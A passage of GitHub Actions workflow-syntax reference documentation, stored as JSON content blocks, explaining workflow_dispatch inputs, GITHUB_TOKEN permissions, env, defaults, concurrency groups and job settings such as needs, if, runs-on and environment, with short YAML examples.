        "content": "on:\n  workflow_dispatch:\n    inputs:\n      logLevel:\n        description: 'Log level'\n        required: true\n        default: 'warning'\n        type: choice\n        options:\n          - info\n          - warning\n          - debug\n      print_tags:\n        description: 'True to print to STDOUT'\n        required: true\n        type: boolean\n      tags:\n        description: 'Test scenario tags'\n        required: true\n        type: string\n      environment:\n        description: 'Environment to run tests against'\n        type: environment\n        required: true\n\njobs:\n  print-tag:\n    runs-on: ubuntu-latest\n    if: ${{ inputs.print_tags }} \n    steps:\n      - name: Print the input tag to STDOUT\n        run: echo  The tags are ${{ inputs.tags }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_dispatch.inputs.<input_id>.required"
      },
      {
        "type": "paragraph",
        "text": "A boolean specifying whether the input must be supplied."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "on.workflow_dispatch.inputs.<input_id>.type"
      },
      {
        "type": "paragraph",
        "text": "The value of this parameter is a string specifying the data type of the input. This must be one of:boolean,choice,number,environmentorstring."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "permissions"
      },
      {
        "type": "paragraph",
        "text": "You can usepermissionsto modify the default permissions granted to theGITHUB_TOKEN, adding or removing access as required, so that you only allow the minimum required access. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "You can usepermissionseither as a top-level key, to apply to all jobs in the workflow, or within specific jobs. When you add thepermissionskey within a specific job, all actions and run commands within that job that use theGITHUB_TOKENgain the access rights you specify. For more information, seejobs.<job_id>.permissions."
      },
      {
        "type": "paragraph",
        "text": "For each of the available permissions, shown in the table below, you can assign one of the access levels:read(if applicable),write, ornone.writeincludesread. If you specify the access for any of these permissions, all of those that are not specified are set tonone."
      },
      {
        "type": "paragraph",
        "text": "Available permissions and details of what each allows an action to do:"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Defining access for theGITHUB_TOKENscopes"
      },
      {
        "type": "paragraph",
        "text": "You can define the access that theGITHUB_TOKENwill permit by specifyingread,write, ornoneas the value of the available permissions within thepermissionskey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  actions: read|write|none\n  attestations: read|write|none\n  checks: read|write|none\n  contents: read|write|none\n  deployments: read|write|none\n  id-token: write|none\n  issues: read|write|none\n  models: read|none\n  discussions: read|write|none\n  packages: read|write|none\n  pages: read|write|none\n  pull-requests: read|write|none\n  security-events: read|write|none\n  statuses: read|write|none"
      },
      {
        "type": "paragraph",
        "text": "If you specify the access for any of these permissions, all of those that are not specified are set tonone."
      },
      {
        "type": "paragraph",
        "text": "You can use the following syntax to define one ofread-allorwrite-allaccess for all of the available permissions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: read-all"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: write-all"
      },
      {
        "type": "paragraph",
        "text": "You can use the following syntax to disable permissions for all of the available permissions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: {}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Changing the permissions in a forked repository"
      },
      {
        "type": "paragraph",
        "text": "You can use thepermissionskey to add and remove read permissions for forked repositories, but typically you can't grant write access. The exception to this behavior is where an admin user has selected theSend write tokens to workflows from pull requestsoption in the GitHub Actions settings. For more information, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Setting theGITHUB_TOKENpermissions for all jobs in a workflow"
      },
      {
        "type": "paragraph",
        "text": "You can specifypermissionsat the top level of a workflow, so that the setting applies to all jobs in the workflow."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Setting theGITHUB_TOKENpermissions for an entire workflow"
      },
      {
        "type": "paragraph",
        "text": "This example shows permissions being set for theGITHUB_TOKENthat will apply to all jobs in the workflow. All permissions are granted read access."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: \"My workflow\"\n\non: [ push ]\n\npermissions: read-all\n\njobs:\n  ..."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "env"
      },
      {
        "type": "paragraph",
        "text": "Amapof variables that are available to the steps of all jobs in the workflow. You can also set variables that are only available to the steps of a single job or to a single step. For more information, seejobs.<job_id>.envandjobs.<job_id>.steps[*].env."
      },
      {
        "type": "paragraph",
        "text": "Variables in theenvmap cannot be defined in terms of other variables in the map."
      },
      {
        "type": "paragraph",
        "text": "When more than one environment variable is defined with the same name, GitHub uses the most specific variable. For example, an environment variable defined in a step will override job and workflow environment variables with the same name, while the step executes. An environment variable defined for a job will override a workflow variable with the same name, while the job executes."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofenv"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "env:\n  SERVER: production"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "defaults"
      },
      {
        "type": "paragraph",
        "text": "Usedefaultsto create amapof default settings that will apply to all jobs in the workflow. You can also set default settings that are only available to a job. For more information, seejobs.<job_id>.defaults."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "defaults.run"
      },
      {
        "type": "paragraph",
        "text": "You can usedefaults.runto provide defaultshellandworking-directoryoptions for allrunsteps in a workflow. You can also set default settings forrunthat are only available to a job. For more information, seejobs.<job_id>.defaults.run. You cannot use contexts or expressions in this keyword."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Set the default shell and working directory"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "defaults:\n  run:\n    shell: bash\n    working-directory: ./scripts"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "defaults.run.shell"
      },
      {
        "type": "paragraph",
        "text": "Useshellto define theshellfor a step. This keyword can reference several contexts. For more information, seeContexts."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "defaults.run.working-directory"
      },
      {
        "type": "paragraph",
        "text": "Useworking-directoryto define the working directory for theshellfor a step. This keyword can reference several contexts. For more information, seeContexts."
      },
      {
        "type": "paragraph",
        "text": "Tip"
      },
      {
        "type": "paragraph",
        "text": "Ensure theworking-directoryyou assign exists on the runner before you run your shell in it.\nWhen more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "concurrency"
      },
      {
        "type": "paragraph",
        "text": "Useconcurrencyto ensure that only a single job or workflow using the same concurrency group will run at a time. A concurrency group can be any string or expression. The expression can only usegithub,inputsandvarscontexts. For more information about expressions, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "paragraph",
        "text": "You can also specifyconcurrencyat the job level. For more information, seejobs.<job_id>.concurrency."
      },
      {
        "type": "paragraph",
        "text": "This means that there can be at most one running and one pending job in a concurrency group at any time. When a concurrent job or workflow is queued, if another job or workflow using the same concurrency group in the repository is in progress, the queued job or workflow will bepending. Any existingpendingjob or workflow in the same concurrency group, if it exists, will be canceled and the new queued job or workflow will take its place."
      },
      {
        "type": "paragraph",
        "text": "To also cancel any currently running job or workflow in the same concurrency group, specifycancel-in-progress: true. To conditionally cancel currently running jobs or workflows in the same concurrency group, you can specifycancel-in-progressas an expression with any of the allowed expression contexts."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The concurrency group name is case insensitive. For example,prodandProdwill be treated as the same concurrency group.",
          "Ordering is not guaranteed for jobs or workflow runs using concurrency groups. Jobs or workflow runs in the same concurrency group are handled in an arbitrary order."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using concurrency and the default behavior"
      },
      {
        "type": "paragraph",
        "text": "The default behavior of GitHub Actions is to allow multiple jobs or workflow runs to run concurrently. Theconcurrencykeyword allows you to control the concurrency of workflow runs."
      },
      {
        "type": "paragraph",
        "text": "For example, you can use theconcurrencykeyword immediately after where trigger conditions are defined to limit the concurrency of entire workflow runs for a specific branch:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "You can also limit the concurrency of jobs within a workflow by using theconcurrencykeyword at the job level:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\njobs:\n  job-1:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: example-group\n      cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Concurrency groups"
      },
      {
        "type": "paragraph",
        "text": "Concurrency groups provide a way to manage and limit the execution of workflow runs or jobs that share the same concurrency key."
      },
      {
        "type": "paragraph",
        "text": "Theconcurrencykey is used to group workflows or jobs together into a concurrency group. When you define aconcurrencykey, GitHub Actions ensures that only one workflow or job with that key runs at any given time. If a new workflow run or job starts with the sameconcurrencykey, GitHub Actions will cancel any workflow or job already running with that key. Theconcurrencykey can be a hard-coded string, or it can be a dynamic expression that includes context variables."
      },
      {
        "type": "paragraph",
        "text": "It is possible to define concurrency conditions in your workflow so that the workflow or job is part of a concurrency group."
      },
      {
        "type": "paragraph",
        "text": "This means that when a workflow run or job starts, GitHub will cancel any workflow runs or jobs that are already in progress in the same concurrency group. This is useful in scenarios where you want to prevent parallel runs for a certain set of a workflows or jobs, such as the ones used for deployments to a staging environment, in order to prevent actions that could cause conflicts or consume more resources than necessary."
      },
      {
        "type": "paragraph",
        "text": "In this example,job-1is part of a concurrency group namedstaging_environment. This means that if a new run ofjob-1is triggered, any runs of the same job in thestaging_environmentconcurrency group that are already in progress will be cancelled."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job-1:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: staging_environment\n      cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, using a dynamic expression such asconcurrency: ci-${{ github.ref }}in your workflow means that the workflow or job would be part of a concurrency group namedci-followed by the reference of the branch or tag that triggered the workflow. In this example, if a new commit is pushed to the main branch while a previous run is still in progress, the previous run will be cancelled and the new one will start:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\nconcurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using concurrency to cancel any in-progress job or run"
      },
      {
        "type": "paragraph",
        "text": "To use concurrency to cancel any in-progress job or run in GitHub Actions, you can use theconcurrencykey with thecancel-in-progressoption set totrue:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "Note that in this example, without defining a particular concurrency group, GitHub Actions will cancelanyin-progress run of the job or workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a fallback value"
      },
      {
        "type": "paragraph",
        "text": "If you build the group name with a property that is only defined for specific events, you can use a fallback value. For example,github.head_refis only defined onpull_requestevents. If your workflow responds to other events in addition topull_requestevents, you will need to provide a fallback to avoid a syntax error. The following concurrency group cancels in-progress jobs or runs onpull_requestevents only; ifgithub.head_refis undefined, the concurrency group will fallback to the run ID, which is guaranteed to be both unique and defined for the run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.head_ref || github.run_id }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Only cancel in-progress jobs or runs for the current workflow"
      },
      {
        "type": "paragraph",
        "text": "If you have multiple workflows in the same repository, concurrency group names must be unique across workflows to avoid canceling in-progress jobs or runs from other workflows. Otherwise, any previously in-progress or pending job will be canceled, regardless of the workflow."
      },
      {
        "type": "paragraph",
        "text": "To only cancel in-progress runs of the same workflow, you can use thegithub.workflowproperty to build the concurrency group:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Only cancel in-progress jobs on specific branches"
      },
      {
        "type": "paragraph",
        "text": "If you would like to cancel in-progress jobs on certain branches but not on others, you can use conditional expressions withcancel-in-progress. For example, you can do this if you would like to cancel in-progress jobs on development branches but not on release branches."
      },
      {
        "type": "paragraph",
        "text": "To only cancel in-progress runs of the same workflow when not running on a release branch, you can setcancel-in-progressto an expression similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: ${{ !contains(github.ref, 'release/')}}"
      },
      {
        "type": "paragraph",
        "text": "In this example, multiple pushes to arelease/1.2.3branch would not cancel in-progress runs. Pushes to another branch, such asmain, would cancel in-progress runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs"
      },
      {
        "type": "paragraph",
        "text": "A workflow run is made up of one or morejobs, which run in parallel by default. To run jobs sequentially, you can define dependencies on other jobs using thejobs.<job_id>.needskeyword."
      },
      {
        "type": "paragraph",
        "text": "Each job runs in a runner environment specified byruns-on."
      },
      {
        "type": "paragraph",
        "text": "You can run an unlimited number of jobs as long as you are within the workflow usage limits. For more information, seeUsage limits, billing, and administrationfor GitHub-hosted runners andUsage limits for self-hosted runnersfor self-hosted runner usage limits."
      },
      {
        "type": "paragraph",
        "text": "If you need to find the unique identifier of a job running in a workflow run, you can use the GitHub API. For more information, seeREST API endpoints for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>to give your job a unique identifier. The keyjob_idis a string and its value is a map of the job's configuration data. You must replace<job_id>with a string that is unique to thejobsobject. The<job_id>must start with a letter or_and contain only alphanumeric characters,-, or_."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Creating jobs"
      },
      {
        "type": "paragraph",
        "text": "In this example, two jobs have been created, and theirjob_idvalues aremy_first_jobandmy_second_job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    name: My first job\n  my_second_job:\n    name: My second job"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.name"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.nameto set a name for the job, which is displayed in the GitHub UI."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.permissions"
      },
      {
        "type": "paragraph",
        "text": "For a specific job, you can usejobs.<job_id>.permissionsto modify the default permissions granted to theGITHUB_TOKEN, adding or removing access as required, so that you only allow the minimum required access. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "By specifying the permission within a job definition, you can configure a different set of permissions for theGITHUB_TOKENfor each job, if required. Alternatively, you can specify the permissions for all jobs in the workflow. For information on defining permissions at the workflow level, seepermissions."
      },
      {
        "type": "paragraph",
        "text": "For each of the available permissions, shown in the table below, you can assign one of the access levels:read(if applicable),write, ornone.writeincludesread. If you specify the access for any of these permissions, all of those that are not specified are set tonone."
      },
      {
        "type": "paragraph",
        "text": "Available permissions and details of what each allows an action to do:"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Defining access for theGITHUB_TOKENscopes"
      },
      {
        "type": "paragraph",
        "text": "You can define the access that theGITHUB_TOKENwill permit by specifyingread,write, ornoneas the value of the available permissions within thepermissionskey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  actions: read|write|none\n  attestations: read|write|none\n  checks: read|write|none\n  contents: read|write|none\n  deployments: read|write|none\n  id-token: write|none\n  issues: read|write|none\n  models: read|none\n  discussions: read|write|none\n  packages: read|write|none\n  pages: read|write|none\n  pull-requests: read|write|none\n  security-events: read|write|none\n  statuses: read|write|none"
      },
      {
        "type": "paragraph",
        "text": "If you specify the access for any of these permissions, all of those that are not specified are set tonone."
      },
      {
        "type": "paragraph",
        "text": "You can use the following syntax to define one ofread-allorwrite-allaccess for all of the available permissions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: read-all"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: write-all"
      },
      {
        "type": "paragraph",
        "text": "You can use the following syntax to disable permissions for all of the available permissions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: {}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Changing the permissions in a forked repository"
      },
      {
        "type": "paragraph",
        "text": "You can use thepermissionskey to add and remove read permissions for forked repositories, but typically you can't grant write access. The exception to this behavior is where an admin user has selected theSend write tokens to workflows from pull requestsoption in the GitHub Actions settings. For more information, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Setting theGITHUB_TOKENpermissions for one job in a workflow"
      },
      {
        "type": "paragraph",
        "text": "This example shows permissions being set for theGITHUB_TOKENthat will only apply to the job namedstale. Write access is granted for theissuesandpull-requestspermissions. All other permissions will have no access."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  stale:\n    runs-on: ubuntu-latest\n\n    permissions:\n      issues: write\n      pull-requests: write\n\n    steps:\n      - uses: actions/stale@v9"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.needs"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.needsto identify any jobs that must complete successfully before this job will run. It can be a string or array of strings. If a job fails or is skipped, all jobs that need it are skipped unless the jobs use a conditional expression that causes the job to continue. If a run contains a series of jobs that need each other, a failure or skip applies to all jobs in the dependency chain from the point of failure or skip onwards. If you would like a job to run even if a job it is dependent on did not succeed, use thealways()conditional expression injobs.<job_id>.if."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Requiring successful dependent jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    needs: [job1, job2]"
      },
      {
        "type": "paragraph",
        "text": "In this example,job1must complete successfully beforejob2begins, andjob3waits for bothjob1andjob2to complete."
      },
      {
        "type": "paragraph",
        "text": "The jobs in this example run sequentially:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "job1",
          "job2",
          "job3"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Not requiring successful dependent jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    if: ${{ always() }}\n    needs: [job1, job2]"
      },
      {
        "type": "paragraph",
        "text": "In this example,job3uses thealways()conditional expression so that it always runs afterjob1andjob2have completed, regardless of whether they were successful. For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.if"
      },
      {
        "type": "paragraph",
        "text": "You can use thejobs.<job_id>.ifconditional to prevent a job from running unless a condition is met. You can use any supported context and expression to create a conditional. For more information on which contexts are supported in this key, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Thejobs.<job_id>.ifcondition is evaluated beforejobs.<job_id>.strategy.matrixis applied."
      },
      {
        "type": "paragraph",
        "text": "When you use expressions in anifconditional, you can, optionally, omit the${{ }}expression syntax because GitHub Actions automatically evaluates theifconditional as an expression. However, this exception does not apply everywhere."
      },
      {
        "type": "paragraph",
        "text": "You must always use the${{ }}expression syntax or escape with'',\"\", or()when the expression starts with!, since!is reserved notation in YAML format. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "if: ${{ ! startsWith(github.ref, 'refs/tags/') }}"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Only run job for specific repository"
      },
      {
        "type": "paragraph",
        "text": "This example usesifto control when theproduction-deployjob can run. It will only run if the repository is namedocto-repo-prodand is within theocto-orgorganization. Otherwise, the job will be marked asskipped."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: example-workflow\non: [push]\njobs:\n  production-deploy:\n    if: github.repository == 'octo-org/octo-repo-prod'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.runs-on"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.runs-onto define the type of machine to run the job on."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The destination machine can be either aGitHub-hosted runner,larger runner, or aself-hosted runner."
        ]
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You can target runners based on the labels assigned to them, or their group membership, or a combination of these.",
          "You can provideruns-onas:A single stringA single variable containing a stringAn array of strings, variables containing strings, or a combination of bothAkey: valuepair using thegrouporlabelskeys",
          "A single string",
          "A single variable containing a string",
          "An array of strings, variables containing strings, or a combination of both",
          "Akey: valuepair using thegrouporlabelskeys",
          "If you specify an array of strings or variables, your workflow will execute on any runner that matches all of the specifiedruns-onvalues. For example, here the job will only run on a self-hosted runner that has the labelslinux,x64, andgpu:runs-on:[self-hosted,linux,x64,gpu]For more information, seeChoosing self-hosted runners.",
          "You can mix strings and variables in an array. For example:on:workflow_dispatch:inputs:chosen-os:required:truetype:choiceoptions:-Ubuntu-macOSjobs:test:runs-on:[self-hosted,\"${{ inputs.chosen-os }}\"]steps:-run:echoHelloworld!",
          "If you would like to run your workflow on multiple machines, usejobs.<job_id>.strategy."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Quotation marks are not required around simple strings likeself-hosted, but they are required for expressions like\"${{ inputs.chosen-os }}\"."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Choosing GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "If you use a GitHub-hosted runner, each job runs in a fresh instance of a runner image specified byruns-on."
      },
      {
        "type": "paragraph",
        "text": "The value for runs-on, when you are using a GitHub-hosted runner, is a runner label or the name of a runner group. The labels for the standard GitHub-hosted runners are shown in the following tables."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Standard GitHub-hosted runners for public repositories"
      },
      {
        "type": "paragraph",
        "text": "For public repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. The use of these runners on public repositories is free and unlimited."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The arm64 Linux and Windows runners are in public preview and subject to change."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Standard GitHub-hosted runners for  private repositories"
      },
      {
        "type": "paragraph",
        "text": "For  private repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. These runners use your GitHub account's allotment of free minutes, and are then charged at the per minute rates. For more information, seeAbout billing for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "In addition to the standard GitHub-hosted runners, GitHub offers customers on GitHub Team and GitHub Enterprise Cloud plans a range of managed virtual machines with advanced features - for example, more cores and disk space, GPU-powered machines, and ARM-powered machines. For more information, seeAbout larger runners."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The-latestrunner images are the latest stable images that GitHub provides, and might not be the most recent version of the operating system available from the operating system vendor."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Beta and Deprecated Images are provided \"as-is\", \"with all faults\" and \"as available\" and are excluded from the service level agreement and warranty. Beta Images may not be covered by customer support."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Specifying an operating system"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs-on: ubuntu-latest"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Choosing self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "To specify a self-hosted runner for your job, configureruns-onin your workflow file with self-hosted runner labels."
      },
      {
        "type": "paragraph",
        "text": "Self-hosted runners may have theself-hostedlabel. When setting up a self-hosted runner, by default we will include the labelself-hosted. You may pass in the--no-default-labelsflag to prevent the self-hosted label from being applied. Labels can be used to create targeting options for runners, such as operating system or architecture, we recommend providing an array of labels that begins withself-hosted(this must be listed first) and then includes additional labels as needed. When you specify an array of labels, jobs will be queued on runners that have all the labels that you specify."
      },
      {
        "type": "paragraph",
        "text": "Note that Actions Runner Controller does not support multiple labels and does not support theself-hostedlabel."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Using labels for runner selection"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs-on: [self-hosted, linux]"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout self-hosted runnersandUsing self-hosted runners in a workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Choosing runners in a group"
      },
      {
        "type": "paragraph",
        "text": "You can useruns-onto target runner groups, so that the job will execute on any runner that is a member of that group. For more granular control, you can also combine runner groups with labels."
      },
      {
        "type": "paragraph",
        "text": "Runner groups can only havelarger runnersorself-hosted runnersas members."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Using groups to control where jobs are run"
      },
      {
        "type": "paragraph",
        "text": "In this example, Ubuntu runners have been added to a group calledubuntu-runners. Theruns-onkey sends the job to any available runner in theubuntu-runnersgroup:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: \n      group: ubuntu-runners\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Combining groups and labels"
      },
      {
        "type": "paragraph",
        "text": "When you combine groups and labels, the runner must meet both requirements to be eligible to run the job."
      },
      {
        "type": "paragraph",
        "text": "In this example, a runner group calledubuntu-runnersis populated with Ubuntu runners, which have also been assigned the labelubuntu-20.04-16core. Theruns-onkey combinesgroupandlabelsso that the job is routed to any available runner within the group that also has a matching label:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      group: ubuntu-runners\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.environment"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.environmentto define the environment that the job references."
      },
      {
        "type": "paragraph",
        "text": "You can provide the environment as only the environmentname, or as an environment object with thenameandurl. The URL maps toenvironment_urlin the deployments API. For more information about the deployments API, seeREST API endpoints for repositories."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "All deployment protection rules must pass before a job referencing the environment is sent to a runner. For more information, seeManaging environments for deployment."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a single environment name"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "environment: staging_environment"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using environment name and URL"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "environment:\n  name: production_environment\n  url: https://github.com"
      },
      {
        "type": "paragraph",
        "text": "The value ofurlcan be an expression. Allowed expression contexts:github,inputs,vars,needs,strategy,matrix,job,runner,env, andsteps. For more information about expressions, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using output as URL"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "environment:\n  name: production_environment\n  url: ${{ steps.step_id.outputs.url_output }}"
      },
      {
        "type": "paragraph",
        "text": "The value ofnamecan be an expression. Allowed expression contexts:github,inputs,vars,needs,strategy, andmatrix. For more information about expressions, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using an expression as environment name"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "environment:\n  name: ${{ github.ref_name }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.concurrency"
      },
      {
        "type": "paragraph",
        "text": "You can usejobs.<job_id>.concurrencyto ensure that only a single job or workflow using the same concurrency group will run at a time. A concurrency group can be any string or expression. Allowed expression contexts:github,inputs,vars,needs,strategy, andmatrix. For more information about expressions, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "paragraph",
        "text": "You can also specifyconcurrencyat the workflow level. For more information, seeconcurrency."
      },
      {
        "type": "paragraph",
        "text": "This means that there can be at most one running and one pending job in a concurrency group at any time. When a concurrent job or workflow is queued, if another job or workflow using the same concurrency group in the repository is in progress, the queued job or workflow will bepending. Any existingpendingjob or workflow in the same concurrency group, if it exists, will be canceled and the new queued job or workflow will take its place."
      },
      {
        "type": "paragraph",
        "text": "To also cancel any currently running job or workflow in the same concurrency group, specifycancel-in-progress: true. To conditionally cancel currently running jobs or workflows in the same concurrency group, you can specifycancel-in-progressas an expression with any of the allowed expression contexts."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
